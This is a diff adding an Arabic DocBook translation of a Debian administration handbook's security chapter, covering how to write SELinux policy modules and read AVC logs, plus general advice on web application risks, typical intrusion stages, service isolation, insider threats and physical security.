+# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
+<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
+<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>
+</screen>
+      </section>
+    </section>
+    <section id="sect.selinux-custom-rules">
+      <title>ملائمة القواعد</title>
+
+      <para>بما أن سياسة SELinux تجزيئية، فقد يهمُّك تطوير وحدات جديدة (أو وحدات مخصصة) للتطبيقات التي تفتقر لهذه الوحدات. عندها سوف تكمل هذه الوحدات <emphasis>السياسة المرجعية reference policy</emphasis>.</para>
+
+      <para>لإنشاء وحدة جديدة، ستحتاج للحزمة <emphasis role="pkg">selinux-policy-dev</emphasis>. بالإضافة إلى <emphasis role="pkg">selinux-policy-doc</emphasis> تحوي الأخيرة وثائق القواعد القياسية (<filename dir="ltr">/usr/share/doc/selinux-policy-doc/html/</filename>) وملفات أمثلة يمكن استخدامها كقوالب لإنشاء الوحدات الجديدة. ثَبِّت هذه الملفات وادرسها بعمق:</para>
+
+      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
+<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>
+
+      <para>ملف <filename dir="ltr">.te</filename> هو الأهم بينها. فهو الذي يحدد القواعد. يُعرِّف الملف <filename dir="ltr">.fc</filename> ”سياقات الملفات“، وهي الأنواع التي تسند إلى الملفات المرتبطة بهذه الوحدة. تُستَخدَم البيانات من الملف <filename dir="ltr">.fc</filename> أثناء مرحلة وسم الملفات. أخيراً، يُعرِّف الملف <filename dir="ltr">.if</filename> واجهة الوحدة: وهي مجموعة من ”الدوال العامة“ التي تستطيع الوحدات الأخرى استخدامها للتفاعل مع هذه الوحدة الجديدة بشكل سليم.</para>
+      <section>
+        <title>كتابة ملف <filename dir="ltr">.fc</filename></title>
+
+	<para>يجب أن تفي قراءة المثال التالي لفهم بنية هذا الملف. يمكنك استخدام التعابير المنتظمة لإسناد السياق الأمني نفسه لعدة ملفات، أو لشجرة ملفات كاملة حتى.</para>
+
+        <example>
+          <title>ملف <filename>example.fc</filename></title>
+
+          <programlisting role="scale"># myapp executable will have:
+# label: system_u:object_r:myapp_exec_t
+# MLS sensitivity: s0
+# MCS categories: &lt;none&gt;
+
+/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)
+</programlisting>
+        </example>
+      </section>
+      <section>
+        <title>كتابة ملف <filename dir="ltr">.if</filename></title>
+
+	<para>في المثال التالي، تتحكم الواجهة الأولى (”<literal>myapp_domtrans</literal>“) بمن يستطيع تنفيذ التطبيق. أما الثانية (”<literal>myapp_read_log</literal>“) فتمنح صلاحيات القراءة على ملفات سجلات التطبيق.</para>
+
+	<para>يجب أن تولد كل واجهة مجموعة صالحة من القواعد التي يمكن تضمينها في ملف <filename dir="ltr">.te</filename>. عليك إذن التصريح عن جميع الأنواع التي تستخدمها (باستخدام الماكرو <literal>gen_require</literal>)، واستخدام التعليمات التوجيهية القياسية لمنح الصلاحيات. لاحظ، على أي حال، أنك تستطيع استخدام الواجهات التي توفرها الوحدات الأخرى. يتفصّل القسم التالي أكثر في شرح طريقة تمثيل هذه الصلاحيات.</para>
+
+        <example>
+          <title>ملف <filename>example.if</filename></title>
+
+          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
+## &lt;desc&gt;
+##      &lt;p&gt;
+##              More descriptive text about myapp.  The &lt;desc&gt;
+##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
+##              html tags for formatting.
+##      &lt;/p&gt;
+##      &lt;p&gt;
+##              This policy supports the following myapp features:
+##              &lt;ul&gt;
+##              &lt;li&gt;Feature A&lt;/li&gt;
+##              &lt;li&gt;Feature B&lt;/li&gt;
+##              &lt;li&gt;Feature C&lt;/li&gt;
+##              &lt;/ul&gt;
+##      &lt;/p&gt;
+## &lt;/desc&gt;
+#
+
+########################################
+## &lt;summary&gt;
+##      Execute a domain transition to run myapp.
+## &lt;/summary&gt;
+## &lt;param name="domain"&gt;
+##      Domain allowed to transition.
+## &lt;/param&gt;
+#
+interface(`myapp_domtrans',`
+        gen_require(`
+                type myapp_t, myapp_exec_t;
+        ')
+
+        domtrans_pattern($1,myapp_exec_t,myapp_t)
+')
+
+########################################
+## &lt;summary&gt;
+##      Read myapp log files.
+## &lt;/summary&gt;
+## &lt;param name="domain"&gt;
+##      Domain allowed to read the log files.
+## &lt;/param&gt;
+#
+interface(`myapp_read_log',`
+        gen_require(`
+                type myapp_log_t;
+        ')
+
+        logging_search_logs($1)
+        allow $1 myapp_log_t:file r_file_perms;
+')
+</programlisting>
+        </example>
+
+        <sidebar>
+          <title><emphasis>توثيق</emphasis> توضيحات حول <emphasis>reference policy</emphasis></title>
+
+	  <para>تتطور <emphasis>السياسة المرجعية</emphasis> كما يتطور أي مشروع برمجية حرة: اعتماداً على مساهمات المتطوعين. تستضيف Tresys هذا المشروع، وهي إحدى أكثر الشركات نشاطاً في مجال SELinux. يتحوي الويكي الخاص بهم على توضيحات عن طريقة صياغة القواعد وكيف يمكنك إنشاء قواعد جديدة. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
+        </sidebar>
+      </section>
+      <section id="sect.writing-a-te-file">
+        <title>كتابة ملف <filename dir="ltr">.te</filename></title>
+
+	<para>لنلق نظرة على الملف <filename>example.te</filename>:</para>
+
+        <sidebar>
+          <title><emphasis>التعمق أكثر</emphasis> لغة الماكرو <command>m4</command></title>
+
+	  <para>لبناء السياسة بشكل سليم، استخدم مطورو SELinux معالج أوامر ماكرو. فبدلاً من نسخ الكثير من تعليمات <emphasis>allow</emphasis> التوجيهية المتشابهة، أنشأوا ”دوالاً ماكروية“ لاستخدام منطق ذا مستوى أعلى، وهذا ينتج أيضاً سياسة قراءتها أسهل لكثير.</para>
+
+	  <para>عملياً، تترجم هذه القواعد عبر استخدام الأداة <command>m4</command> التي تجري العملية المعاكسة: حيث توسّع جميع هذه التعليمات عالية المستوى إلى قاعدة بيانات عملاقة من تعليمات <emphasis>allow</emphasis>.</para>
+
+	  <para>”واجهات“ SELinux هي مجرد دوال ماكروية تُستبدَل بمجموعة قواعد أثناء الترجمة. وكذلك، هناك بعض الصلاحيات التي تتألف في الواقع من مجموعة من الصلاحيات التي تستبدل بقيمها عند الترجمة.</para>
+        </sidebar>
+
+        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>
+
+########################################
+#
+# Declarations
+#
+
+type myapp_t; <co id="example.te.type"></co>
+type myapp_exec_t;
+domain_type(myapp_t)
+domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>
+
+type myapp_log_t;
+logging_log_file(myapp_log_t) <co id="example.te.interface"></co>
+
+type myapp_tmp_t;
+files_tmp_file(myapp_tmp_t)
+
+########################################
+#
+# Myapp local policy
+#
+
+allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>
+
+allow myapp_t myapp_tmp_t:file manage_file_perms;
+files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
+</programlisting>
+        <calloutlist>
+          <callout arearefs="example.te.module">
+	    <para>يجب تعريف الوحدة باسمها ورقم إصدارها. هذه التعليمة إلزامية.</para>
+          </callout>
+          <callout arearefs="example.te.type">
+	    <para>إذا كانت الوحدة تُعرّف أنواعاً جديدة، فعليها التصريح عنها باستخدام تعليمات كهذه. لا تتردد في إنشاء أنواع كثيرة بقدر الحاجة بدلاً من منح صلاحيات عديمة الجدوى.</para>
+          </callout>
+          <callout arearefs="example.te.domain">
+	    <para>تُعرّف هذه الواجهات النوع <literal>myapp_t</literal> كنطاق للعمليات الذي يجب استخدامه مع أي ملف تنفيذي موسوم بالنوع <literal>myapp_exec_t</literal>. ضمنياً، هذا يضيف الصفة <literal>exec_type</literal> إلى هذه الكائنات، التي تسمح بدورها للوحدات الأخرى بمنح صلاحيات تنفيذ هذه البرامج: مثلاً، تسمح الوحدة <literal>userdomain</literal>  للعمليات ذات النطاقات <literal>user_t</literal>، و <literal>staff_t</literal>، و <literal>sysadm_t</literal> بتنفيذها. أما نطاقات البرمجيات المقيّدة الأخرى فلا تملك صلاحيات تنفيذها، إلا إذا منحتها القواعد صلاحيات مشابهة (هذه هي حالة <command>dpkg</command> ونطاقه <literal>dpkg_t</literal>، على سبيل المثال).</para>
+          </callout>
+          <callout arearefs="example.te.interface">
+	    <para><literal>logging_log_file</literal> هي واجهة تقدمها السياسة المرجعية. وهي تدل أن الملفات الموسومة بهذا النوع المحدد هي ملفات سجلات ويجب أن تستفيد من القواعد المختصة بالسجلات (مثلاً منح الصلاحيات لبرنامج <command>logrotate</command> بحيث يستطيع معالجتها).</para>
+          </callout>
+          <callout arearefs="example.te.allow">
+	    <para>تعليمة <literal>allow</literal> هي التعليمة الأساسية المستخدمة للسماح بتنفيذ إجراء. المتغير الأول هو نطاق العملية المخولة بتنفيذ الإجراء. أما المتغير الثاني فهو يُعرّف الكائنات التي سيسمح للعمليات من النطاق السابق بالتعديل عليها. صيغة هذا المتغير هي ”<replaceable>type</replaceable>:<replaceable>class</replaceable>“ حيث <replaceable>type</replaceable> هو النوع في SELinux ويحدد الصنف <replaceable>class</replaceable> طبيعة الكائن (ملف، مجلد، مقبس شبكي، fifo، الخ). أخيراً، يحدد المتغير الأخير الصلاحيات (الإجراءات المسموحة).</para>
+
+	    <para>تُعرّف الصلاحيات بشكل مجموعة من الإجراءات المسموحة وهي تتبع هذا القالب: <literal dir="ltr">{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. لكن يمكنك أيضاً استخدام ماكروات تعبر عن الصلاحيات التي تفيدك. يسرد الملف <filename dir="ltr">/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> الماكروات المتاحة.</para>
+
+	    <para>تقدم صفحة الوب التالية قائمة شاملة نسبياً لأصناف الكائنات، والصلاحيات التي يمكن منحها. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
+          </callout>
+        </calloutlist>
+
+	<para>كل ما عليك الآن هو إيجاد أقل مجموعة من القواعد اللازمة لضمان عمل التطبيق أو الخدمة بشكل صحيح. لتحقيق هذا، يجب أن تعرف طريقة عمل التطبيق جيداً وأن تعرف نوع البيانات التي يديرها أو يولدها.</para>
+
+	<para>على أي حال، يمكن استخدام الطريقة التجريبية. حيث يمكنك فور وسم الكائنات المناسبة بشكل صحيح، استخدام التطبيق في الوضع المتساهل: فالعمليات التي ستحظر سوف تسجل لكنها ستنفّذ بنجاح مع ذلك. يمكنك الآن عبر تحليل السجلات معرفة العمليات التي يجب السماح بها. إليك مثالاً عن هذا النوع من مدخلات السجل:</para>
+
+        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>
+
+	<para>دعنا ندرس هذه الرسالة قطعة بعد أخرى حتى نفهمها بشكل أفضل.</para>
+
+        <table colsep="1">
+          <title>تحليل أثر SELinux</title>
+          <tgroup cols="2">
+            <thead>
+              <row>
+                <entry>الرسالة</entry>
+                <entry>الوصف</entry>
+              </row>
+            </thead>
+            <tbody>
+              <row>
+                <entry><computeroutput>avc: denied</computeroutput></entry>
+                <entry>هذا الإجراء قد مُنع.</entry>
+              </row>
+              <row>
+                <entry><computeroutput>{ read write }</computeroutput></entry>
+                <entry>يحتاج هذا الإجراء لصلاحيات <literal>read</literal> و <literal>write</literal>.</entry>
+              </row>
+              <row>
+                <entry><computeroutput>pid=1876</computeroutput></entry>
+                <entry>نفّذت العملية ذات PID رقم 1876 الإجراء (أو حاولت تنفيذه).</entry>
+              </row>
+              <row>
+                <entry><computeroutput dir="ltr">comm="syslogd"</computeroutput></entry>
+                <entry>كانت العملية تنفذ البرنامج <literal>syslogd</literal>.</entry>
+              </row>
+              <row>
+                <entry><computeroutput dir="ltr">name="xconsole"</computeroutput></entry>
+                <entry>العنصر المستهدف اسمه <literal>xconsole</literal>. أحياناً قد يعطيك متغير ”path“ —يحوي المسار الكامل— بدلاً من هذا.</entry>
+              </row>
+              <row>
+                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
+                <entry>الجهاز الذي يستضيف الكائن الهدف هو <literal>tmpfs</literal> (نظام ملفات في الذاكرة). بالنسبة للأقراص الحقيقية، يمكن أن ترى القسم الذي يستضيف الكائن (مثلاً: ”sda3“).</entry>
+              </row>
+              <row>
+                <entry><computeroutput>ino=5510</computeroutput></entry>
+                <entry>الكائن مُعرّف برقم inode يساوي 5510.</entry>
+              </row>
+              <row>
+                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
+                <entry>هذا هو السياق الأمني للعملية التي نفّذت الإجراء.</entry>
+              </row>
+              <row>
+                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
+                <entry>هذا هو السياق الأمني للكائن الهدف.</entry>
+              </row>
+              <row>
+                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
+                <entry>الكائن الهدف هو ملف FIFO.</entry>
+              </row>
+            </tbody>
+          </tgroup>
+        </table>
+
+	<para>من خلال دراسة مدخلة السجل هذه، يمكننا بناء قاعدة تسمح بهذا الإجراء. مثلاً: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. يمكن أتمتة هذه العملية، وهذا بالضبط ما يُقدِّمه الأمر <command>audit2allow</command> (من الحزمة <emphasis role="pkg">policycoreutils</emphasis>). يفيد هذا الأسلوب فقط إذا كانت الكائنات المختلفة موسومة مسبقاً بشكل صحيح وفقاً للعملية التي يجب تقييدها. في جميع الحالات، عليك مراجعة القواعد المولدة بحذر والتحقق من صحتها على حسب معرفتك بالتطبيق. في الواقع، تميل هذه الطريقة لمنح صلاحيات أكثر مما يلزم فعلاً. الحل الأنسب غالباً هو إنشاء أنواع جديدة ومنح الصلاحيات على هذه الأنواع فقط. كما قد تصادفك أيضاً إجراءات لا يكون حظرها مصيرياً بالنسبة للتطبيق، وفي تلك الحالة قد تكون إضافة ”<literal>dontaudit</literal>“ فقط لتفادي تسجيل مدخلة في السجل رغم حظر الإجراء أفضل.</para>
+
+        <sidebar>
+          <title><emphasis>تتمة</emphasis> لا أدوار في قواعد السياسة</title>
+          <indexterm><primary>Type Enforcement</primary></indexterm>
+          <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>
+
+	  <para>قد تستغرب عدم ظهور الأدوار أبداً عند إنشاء قواعد جديدة. يستخدم SELinux النطاقات فقط ليعرف الإجراءات المسموحة. يتدخل الدور بشكل غير مباشر فقط عند السماح للمستخدم بالتبديل إلى نطاق مختلف. يعتمد SELinux على نظرية تعرف باسم <emphasis>Type Enforcement</emphasis> والنوع هو العنصر الوحيد الذي يؤثر في عملية منح الصلاحيات.</para>
+        </sidebar>
+      </section>
+      <section>
+        <title>ترجمة الملفات</title>
+
+	<para>بعد أن تتفق الملفات الثلاثة (<filename>example.if</filename>، و<filename>example.fc</filename>، و<filename>example.te</filename>) مع القواعد الجديدة التي تريدها، يكفي استدعاء <command>make NAME=devel</command> لتوليد وحدة بالاسم <filename>example.pp</filename> (يمكنك تحميلها فوراً باستخدام <command>semodule -i example.pp</command>). إذا عَرَّفت عدة وحدات، سوف ينشئ <command>make</command> جميع ملفات <filename dir="ltr">.pp</filename> الموافقة لها.</para>
+      </section>
+    </section>
+  </section>
+  <section id="sect.other-security-considerations">
+    <title>اعتبارات أمنية أخرى</title>
+
+    <para>ليس الأمن مشكلة تقنية وحسب؛ بل الأهم من كل شيء، العادات الحسنة وفهم المخاطر. يراجع هذا القسم بعض المخاطر الأكثر انتشاراً، بالإضافة لبعض الممارسات الجيدة التي يجب، حسب الحالة طبعاً، أن تزيد أمن النظام أو تخفف ضرر الهجمات الناجحة.</para>
+    <section>
+      <title>المخاطر الملازمة لتطبيقات الوب</title>
+
+      <para>أدت الطبيعة العالمية لتطبيقات الوب لانتشارها. غالباً ما يتم تشغيل عدة تطبيقات وب على التوازي: webmail، ويكي، نظام إدارة مجموعات، منتديات، ألبوم صور، مدونة، وغيرها. تعتمد معظم هذه التطبيقات على ”LAMP‏“ (<emphasis>Linux, Apache, MySQL, PHP</emphasis>). لسوء الحظ، تكتب معظم هذه التطبيقات دون اعتبار المشاكل الأمنية كثيراً. في معظم الأحيان، تستخدم البيانات الواردة من العالم الخارجي بعد التحقق منها بشكل ضعيف أو بلا تحقق أبداً. يمكن تقديم قيم مُعدَّة خصيصاً لإفساد استدعاء أحد الأوامر بحيث يتم تنفيذ أمر آخر بدلاً منه. أُصلِحَت معظم المشاكل الواضحة عبر الزمن، لكن تظهر مشاكل أمنية جديدة بانتظام.</para>
+
+      <sidebar>
+        <title><emphasis>مصطلحات</emphasis> SQL injection</title>
+
+	<para>عندما يُدخِل البرنامج بيانات عبر استعلامات SQL بأسلوب غير آمن، يصبح عرضة لهجمات SQL injection، يشير الاسم إلى عملية تغيير بارامتر بحيث يختلف الاستعلام الفعلي الذي سينفذه البرنامج عن الاستعلام المرغوب، إما لتدمير قاعدة البيانات أو للوصول إلى بيانات لا يفترض أن يُسمَح بالوصول لها في الحالة الطبيعية. <ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" /></para>
+        <indexterm><primary>SQL injection</primary></indexterm>
+      </sidebar>
+
+      <para>لا مفر من تحديث تطبيقات الوب بانتظام، خشية أن يتمكن أي مخرب (سواء كان مهاجماً محترفاً أو script kiddy) من استغلال ثغرة معروفة. يختلف الخطر الفعلي حسب الحالة، ويتراوح ما بين تدمير البيانات إلى تنفيذ أكواد عشوائية، بما في ذلك تشويه الموقع (defacement).</para>
+    </section>
+    <section>
+      <title>تَعرَّف على ما ينتظرك</title>
+
+      <para>غالباً ما تُستَخدَم الثغرة في تطبيق الوب كنقطة انطلاق لمحاولات الاختراق. فيما يلي استعراض قصير للعواقب المحتملة.</para>
+
+      <sidebar>
+        <title><emphasis>نظرة سريعة</emphasis> ترشيح طلبات HTTP</title>
+
+	<para>يتضمن Apache 2 وحدات تسمح بترشيح طلبات HTTP. يسمح هذا بمنع بعض أنواع الهجمات. مثلاً، يمكن أن يمنع تحديد طول المتغيرات هجمات buffer overflow. على العموم، يمكن التحقق من المتغيرات قبل تمريرها إلى تطبيق الوب وتقييد الوصول اعتماداً على معايير عديدة. بل يمكن استخدام هذا أيضاً مع تحديثات ديناميكية للجدار الناري، بحيث يُمنَع العميل الذي يخرق إحدى القواعد من الوصول لمخدم الوب لفترة محددة من الزمن.</para>
+
+	<para>قد يكون إعداد هذه الفحوصات عملية طويلة وبطيئة، لكنها قد تؤتي ثمارها إذا كان تطبيق الوب المستخدم له سجل أمني مشبوه.</para>
+
+	<para>وحدة <emphasis>mod-security2</emphasis> (في الحزمة <emphasis role="pkg">libapache2-mod-security2</emphasis>) هي الحزمة الأساسية في هذا المجال. بل إنها ترفق مع قواعد كثيرة جاهزة للاستخدام (في الحزمة <emphasis role="pkg">modsecurity-crs</emphasis>) يمكنك تفعيلها بسهولة.</para>
+        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
+        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
+      </sidebar>
+
+      <para>يختلف مدى وضوح آثار الاختراق حسب أهداف المهاجم. يطبق <emphasis>Script-kiddy</emphasis> الوصفات التي يجدها على مواقع الوب فقط؛ أغلب الأحيان، سوف يشوه مظهر صفحة وب أو يحذف بيانات. في الحالات الأكثر حذقاً، سيضيف محتوى غير مرئي لصفحات الوب بحيث تتحسن referrals لموقعه الشخصي في محركات البحث.</para>
+
+      <para>أما المهاجم الأكثر تقدماً فسوف يسعى لما هو أبعد من ذلك. من السيناريوهات الكارثية أن يحدث ما يلي: يتمكن المهاجم من تنفيذ الأوامر تحت هوية المستخدم <literal>www-data</literal>، لكن تنفيذ الأوامر يحتاج للكثير من المناورات. لتسهيل الوضع على نفسه، سوف يثبّت تطبيقات وب أخرى مصممة خصيصاً لتنفيذ انواع كثيرة من الأوامر عن بعد، مثل تصفح نظام الملفات، فحص الصلاحيات، رفع أو تنزيل الملفات، تنفيذ الأوامر، أو حتى تقديم سطر أوامر عبر الشبكة. أغلب الأحيان، ستسمح لهم الثغرة بتنفيذ الأمر <command>wget</command> لتنزيل برمجية خبيثة ما ضمن المجلد <filename>/tmp/</filename>، ثم تنفيذها. تُنزّل البرمجيات الخبيثة من مواقع غريبة مُختَرَقة سابقاً، وذلك لتغطية الأثر وجعل تقفي الأدلة إلى المصدر الفعلي للهجوم أصعب.</para>
+
+      <para>عند هذه النقطة، يتمتع المهاجم بحرية حركة تكفيه بحيث يعمد غالباً لتثبيت <emphasis>بوت</emphasis> IRC (روبوت يتصل بمخدم IRC ويمكن التحكم به عبر هذه القناة). يستخدم هذه البوت غالباً لمشاركة ملفات غير قانونية (نسخ غير مصرح بها لبرمجيات أو أفلام، وما شابه). أما المهاجم عاقد العزم فقد يرغب بالتعمق أكثر من ذلك أيضاً. لا يسمح حساب <literal>www-data</literal> بالتحكم الكامل بالجهاز، وسيحاول المهاجم الحصول على صلاحيات الجذر. نظرياً، يفترض أن هذا غير ممكن، لكن إذا كان تطبيق الوب غير محدث، فيحتمل أن إصدارات النواة والبرامج الأخرى قديمة أيضاً؛ ينتج هذا أحياناً عن مدير نظام أهمل تحديث النظام، رغم معرفته بوجود ثغرة، لعدم وجود مستخدمين محليين للنظام. يمكن عندئذ للمهاجم أن يستفيد من هذه الثغرة الثانية للحصول على صلاحيات الجذر.</para>
+
+      <sidebar>
+        <title><emphasis>مصطلحات</emphasis> تصعيد الصلاحيات</title>
+
+	<para>يشير هذا المصطلح لأي شيء يمكن استخدامه للحصول على صلاحيات أعلى مما يفترض أن يحصل عليه المستخدم في الحالة الطبيعية. البرنامج <command>sudo</command> مصمم خصيصاً بهدف منح صلاحيات إدارة النظام لبعض المستخدمين. لكن المصطلح نفسه يُستخدَم لوصف عملية استغلال المهاجم ثغرة في النظام للحصول على صلاحيات غير مستحقة. المصطلح بالإنكليزية هو privilege escalation.</para>
+      </sidebar>
+
+      <para>أصبح الجهاز الآن ملكاً للمهاجم؛ الذي سيحاول عادة الاحتفاظ بصلاحية الوصول هذه لأطول فترة ممكنة. هذا يقتضي تثبيت <emphasis>rootkit</emphasis>، وهو نوع من البرامج يستبدل بعض مكونات النظام بحيث يتمكن المهاجم من الحصول على صلاحيات الإدارة ثانيةً في وقت لاحق؛ كما يحاول الـ rootkit إخفاء نفسه وإخفاء أي آثار لعملية الاختراق. سوف يُغفِل برنامج <command>ps</command> بعد تخريبه بعض العمليات، ولن يَذكُرَ <command>netstat</command> بعض الاتصالات الفعالة، وهكذا. إذا تمكن المهاجم من مراقبة النظام كاملاً، لكنه لم يعثر على بيانات مهمة؛ سيحاول الوصول لأجهزة أخرى في شبكة الشركة عبر الاستفادة من صلاحيات الجذر. يستطيع المهاجم العثور على الأجهزة التي يتصل المدير بها بانتظام عبر تحليل حساب مدير النظام وملفات التاريخ. وباستبدال <command>sudo</command> أو <command>ssh</command> ببرنامج مخرَّب، يستطيع المهاجم اعتراض بعض كلمات سر مدير النظام، ثم يستعملها على المخدمات التي اكتشفها... ويمكن لعملية الاختراق أن تنتشر من الآن فصاعداً.</para>
+
+      <para>يمكن أن نمنع هذا السيناريو الكارثي من أن يحدث عبر العديد من التدابير. تتحدث الأقسام القليلة القادمة عن بعض هذه التدابير.</para>
+    </section>
+    <section id="sect.choosing-the-software-wisely">
+      <title>اختيار البرمجيات بحكمة</title>
+
+      <para>بعد معرفة المشاكل الأمنية، يجب أخذها بعين الاعتبار في كل مرحلة من مراحل تنصيب (deploy) خدمة، خصوصاً عند اختيار البرمجيات لتثبيتها. تحتفظ العديد من المواقع، مثل <literal>SecurityFocus.com</literal>، بلائحة بالثغرات المكتشفة حديثاً، التي يمكن أن تعطيك فكرة عن السجل الأمني للبرنامج قبل أن تختار تثبيته. طبعاً، يجب أن توازن هذه المعلومات مع شهرة هذه البرامج: فكلما زاد استخدام البرنامج انتشاراً كلما أصبح هدفاً أكثر جاذبية، وكلما زاد تفحصه بتمعن. من جهة أخرى، قد تعج البرامج غير الشهيرة بالثغرات الأمنية التي لا تكشف للعلن أبداً لعدم الاهتمام بفحصه أمنياً.</para>
+
+      <sidebar>
+        <title><emphasis>مصطلحات</emphasis> فحص أمني</title>
+
+	<para>الفحص الأمني (security audit) هي عملية قراءة وتحليل شاملة للكود المصدري لبعض البرمجيات بحثاً عن أي ثغرات أمنية قد يحويها. هذه الفحوصات وقائية عادة، وهي تُجرى لضمان أن البرنامج يلبي متطلبات أمنية معينة.</para>
+      </sidebar>
+
+      <para>في عالم البرمجيات الحرة، هناك عموماً مساحة واسعة للاختيار، ويجب أن يعتمد قرار تفضيل برمجية معينة على غيرها على معايير محلية. المزايا الإضافية تعني زيادة خطر وجود ثغرة متخفّية في الكود؛ كما أن اختيار أكثر البرامج تقدُّماً لأداء مهمة ما قد يعيق الإنتاجية، والحل الأفضل عادة هو اختيار أبسط برنامج يلبي المتطلبات.</para>
+
+      <sidebar>
+        <title><emphasis>مصطلحات</emphasis> Zero-day exploit</title>
+
+	<para>يصعب ردع هجمات <emphasis>zero-day exploit</emphasis>؛ يشير المصطلح إلى الثغرات في البرنامج التي لا يعلم بها مطورو البرنامج بعد.</para>
+      </sidebar>
+    </section>
+    <section id="sect.managing-a-machine-as-a-whole">
+      <title>إدارة الجهاز ككيان واحد</title>
+
+      <para>تُثبّت معظم توزيعات لينكس افتراضياً عدداً من خدمات يونكس وأدوات كثيرة. في معظم الحالات، لا تكون هذه الخدمات والأدوات لازمة للأغراض الفعلية التي أعد مدير النظام الجهاز لأجلها. كقاعدة عامة في النواحي الأمنية، يفضل إزالة أي البرمجيات التي لا حاجة لها. وحقاً، لا فائدة من تأمين مخدم FTP، إذا كان هناك ثغرة في خدمة مختلفة غير مستخدمة، يمكن استخدامها للحصول على صلاحيات الإدارة للجهاز كله.</para>
+
+      <para>وحسب القاعدة نفسها، تضبط الجدران النارية غالباً للسماح فقط بالوصول إلى الخدمات التي يفترض أن تكون متاحة للوصول العام.</para>
+
+      <para>الحواسيب المعاصرة قوية بما يكفي لتسمح باستضافة العديد من الخدمات على الجهاز الفيزيائي نفسه. هذه الإمكانية مثيرة للاهتمام من وجهة نظر اقتصادية: حاسوب واحد لإدارته، استهلاك طاقة أقل، وهكذا. لكن من وجهة نظر أمنية، هذه الخيار مشكلة. فاختراق خدمة واحدة قد يؤدي للدخول للجهاز كله، وهذا يسمح بتخريب الخدمات الأخرى المستضافة على الجهاز نفسه. يمكن الحد من هذا الخطر عبر عزل الخدمات. يمكن تحقيق ذلك إما باستخدام الحوسبة التَخيُّلية (تستضاف كل خدمة على جهاز وهمي خاص بها أو حاوية مستقلة)، أو باستخدام AppArmor/SELinux (حيث تتمتع كل خدمة بمجموعة ملائمة من الصلاحيات).</para>
+    </section>
+    <section id="sect.users-are-players">
+      <title>المستخدمين كفاعلين</title>
+
+      <para>عند الحديث عن الأمن، نتخيل فوراً الحماية من هجمات مخترفين مجهولين يختبئون في أدغال الإنترنت؛ لكن الحقيقة المنسية غالباً هي أن المخاطر تأتي أيضاً من الداخل: يمكن أن يُنزِّل أحد الموظفين الذين سُرِّحوا من عملهم في الشركة ملفات حساسة عن المشاريع المهمة ويبيعها للمنافسين، أو قد يترك أحد مندوبي المبيعات المهملين مكتبه دون إغلاق جلسة العمل عند غيابه للحاق بفرصة جديدة، أو قد يحذف مستخدم أخرق المجلد الخاطئ دون قصد، وهكذا.</para>
+
+      <para>قد تشمل الاستجابة لهذه المخاطر حلولاً تقنية: فلا يجب منح المستخدمين صلاحيات أعلى من اللازم، ولا بد من أخذ نسخ احتياطية بانتظام. لكن في العديد من الحالات، سوف تتضمن الحماية الجيدة تدريب المستخدمين لتفادي المخاطر.</para>
+
+      <sidebar>
+        <title><emphasis>نظرة سريعة</emphasis> <emphasis role="pkg">autolog</emphasis></title>
+
+	<para>توفر الحزمة <emphasis role="pkg">autolog</emphasis> برنامجاً يقطع اتصال المستخدمين غير النشطين آلياً بعد تأخير زمني محدد. كما يتيح أيضاً قتل عمليات المستخدم التي تبقى بعد انتهاء جلسة العمل، وبذلك يمنع المستخدمين من تشغيل الخدمات.</para>
+      </sidebar>
+    </section>
+    <section id="sect.physical-security">
+      <title>الأمن الفيزيائي</title>
+
+      <para>لا فائدة من تأمين الخدمات والشبكات إذا لم تؤمن الحواسيب نفسها. تستحق البيانات المهمة تخزينها على سواقات صلبة تدعم الاستبدال الساخن في مصفوفات RAID، لأن الأقراص الصلبة ستتعطل في النهاية ولا بد من الحفاظ على توافر البيانات. لكن إذا كان أي فتى توصيل بيتزا يستطيع دخول المبنى، والتسلل لغرفة المخدم والهرب ببضعة أقراص صلبة مختارة، فهذا يعني نقص جزء هام من الحماية. من يستطيع دخول غرفة المخدم؟ هل الدخول مراقب؟ هذه الأسئلة تستحق النظر فيها (والإجابة عليها) عند تقييم الأمن الفيزيائي.</para>
+
+      <para>كما يتضمن الأمن الفيزيائي أخذ خطر الحوادث بعين الاعتبار أيضاً كالحرائق. هذا الخطر بالذات يبرر تخزين وسائط النسخ الاحتياطي في مبنى منفصل، أو على الأقل في خزينة مقاومة للحريق.</para>
+    </section>
+    <section>
+      <title>المسؤولية القانونية</title>
+
